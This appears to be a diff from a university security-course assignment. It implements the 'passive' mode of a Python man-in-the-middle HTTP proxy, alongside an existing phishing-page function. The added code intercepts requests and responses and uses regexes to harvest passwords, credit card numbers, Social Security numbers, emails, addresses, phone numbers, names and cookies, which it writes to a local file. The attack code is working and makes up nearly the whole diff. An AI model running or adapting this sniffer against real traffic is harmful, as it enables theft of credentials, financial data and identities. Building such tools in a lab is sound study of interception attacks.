@@ -4,6 +4,7 @@ import socket
 import threading
 import re
 from urllib.parse import unquote
+from names_dataset import NameDataset
 
 '''
 NOTE
@@ -16,9 +17,10 @@ lsof -i :8080 # Get the PID of the process running on port 8080
 kill -9 <PID> # Kill the process
 '''
 
-DEBUG = True
+DEBUG = False
 PROXY_IP = "127.0.0.1"
 PROXY_PORT = 8080
+names_data = NameDataset() # Initialize the names-dataset library
 
 def generate_phishing_page():
     if DEBUG:
@@ -219,9 +221,145 @@ def proxy_active(listening_ip, listening_port):
         client_thread = threading.Thread(target=handle_active_client, args=(client_socket, ))
         client_thread.start()
 
+####################################################################################################
+####################################################################################################
+def log_info(info, data_type):
+    with open("info1.txt", "a") as f:
+        f.write(f"--- {data_type.upper()} DATA ---\n")
+        for key, values in info.items():
+            for value in values:
+                f.write(f"{key}: {value}\n")
+        f.write("\n")
+    print(f"{data_type.upper()} data logged to info1.txt.")
+
+def extract_names(data):
+    """
+    Extracts names using the names-dataset library.
+    """
+   # Decode URL-encoded strings
+   # The unquote function reverses this encoding. It takes a URL-encoded string as input and returns a string with all the %xx escapes replaced by the characters they represent. For example:
+    # example: unquote("Hello%20World") would return "Hello World".
+    # example: unquote("Caf%C3%A9") would return "Café".
+    decoded_data = unquote(data.lower())  # Convert data to lowercase
+
+    # Choose an appropriate splitting method based on your data format
+    # For example, splitting by '&' for URL query parameters
+    words = re.split('&|\s|\n|=', decoded_data)
+
+    # Get the top 100 common names in the US
+    common_names = names_data.get_top_names(n=100, country_alpha2='US')
+    male_names = common_names['US']['M']
+    female_names = common_names['US']['F']
+    all_genders_names = male_names + female_names
+    common_names = [name.lower() for name in all_genders_names] # Convert common names to lowercase
+    names = []
+    for word in words:
+        if word in common_names:
+            names.append(word)
+    return names
+
+
+# Example: http://cs468.cs.uic.edu/submit?firstname=andrea&lastname=papa&birthday=2222-12-22&email=trial%40gmail.com&password=123465676&address=2343+West+Taylor+Street&credit-card=1234567812345678&social-security=111-11-1111&phone=123-404-9898&city=Chicago&state=IL&zip=55555
+def parse_http_packet(data, type_packet):
+    if DEBUG:
+        print("Packet data:\n{}".format(data))
+
+    # Regular expressions for sensitive information
+    regex_patterns = {
+        'firstname_query': r'firstname=([^&\s]+)',
+        'lastname_query': r'lastname=([^&\s]+)',
+        'birthday_query': r'birthday=([^&\s]+)',
+        'email': r'\b[A-Za-z0-9._]+(?:%40|@)[A-Za-z0-9._]+\.[A-Z|a-z]{2,}\b',
+        'password_query': r'password=([^&\s]+)',
+        'credit_card': r'\b(?:\d[ -]*?){13,16}\b',
+        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
+        'phone_number': r'\b\d{3}-\d{3}-\d{4}\b',
+        'address': r'\d+\+[A-Za-z]+\+[A-Za-z]+',
+        'address_query': r'address=([^&]+)',
+        'city_query': r'city=([^&\s]+)',
+        'state_query': r'state=([^&\s]+)',
+        'zip_query': r'zip=([^&\s]+)'
+    }
+
+    output = {}
+    # Check and log each pattern
+    for key, pattern in regex_patterns.items():
+        matches = re.findall(pattern, data)
+        if DEBUG:
+            print("Matches for {}: {}".format(key, matches))
+        if matches:
+            if key == 'address_query' or key == 'address':
+                matches = [match.replace('+', ' ') for match in matches]
+            if key == 'email':
+                matches = [match.replace('%40', '@') for match in matches]
+            output[key] = matches
+    
+    # extract names using names-dataset
+    name_matches = extract_names(data)
+    if name_matches:
+        output['names'] = name_matches
+
+    cookies = re.findall(r'Cookie: (.*?)(?:\r\n|$)', data)
+    if cookies:
+        output['cookies'] = cookies
+
+    if 'Set-Cookie:' in data:
+        cookies = re.findall(r'Set-Cookie: (.*?);', data)
+        output['cookies'] = cookies
+
+    if output:
+        log_info(output, type_packet)
+    else:
+        print("No sensitive information found in the {}.".format(type_packet))
+
+
+def handle_passive_client(client_socket):
+    with client_socket:
+        request = client_socket.recv(4096)
+        request_data = request.decode('utf-8')
+        # Parse the HTTP request to get the destination host and port
+        host, port = get_destination_host_port(request_data)
+
+        print("Handling HTTP request to host: {}, port: {}".format(host, port))
+
+        # Process request data
+        parse_http_packet(request_data, 'request')
+        # Forwarding the request to the destination server (simplified)
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.connect((host, port))
+        server_socket.send(request)
+
+        # Process server response
+        response = server_socket.recv(4096)
+        try:
+            response_data = response.decode('utf-8')
+        except UnicodeDecodeError:
+            print("UnicodeDecodeError")
+            client_socket.close()
+            server_socket.close()
+            print("Client connection closed.")
+            return
+        print("Handling response from host: {}, port: {}".format(host, port))
+        parse_http_packet(response_data, 'response')
+        client_socket.send(response)
 
 def proxy_passive(listening_ip, listening_port):
-    print("Not implemented yet.")
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((listening_ip, int(listening_port)))
+    server.listen(5)
+    print("Proxy server listening on {}:{}".format(listening_ip, listening_port))
+
+    while True:
+        client_socket, client_address = server.accept()
+        if client_address[0] != listening_ip:
+            print("Invalid client IP. Exiting...")
+            exit(1)
+        print("\n\nClient connected from {}:{}".format(client_address[0], client_address[1]))
+        client_thread = threading.Thread(target=handle_passive_client, args=(client_socket, ))
+        client_thread.start()
+
+####################################################################################################
+####################################################################################################
 
 def main():
     parser = argparse.ArgumentParser(description='Proxy', add_help=False)
@@ -235,7 +373,7 @@ def main():
     if DEBUG:
         args.listening_ip = "127.0.0.1"
         args.listening_port = "8080"
-        args.mode = "active"
+        args.mode = "passive"
     
     if args.listening_ip is None:
         print("No listening IP provided. Exiting...")
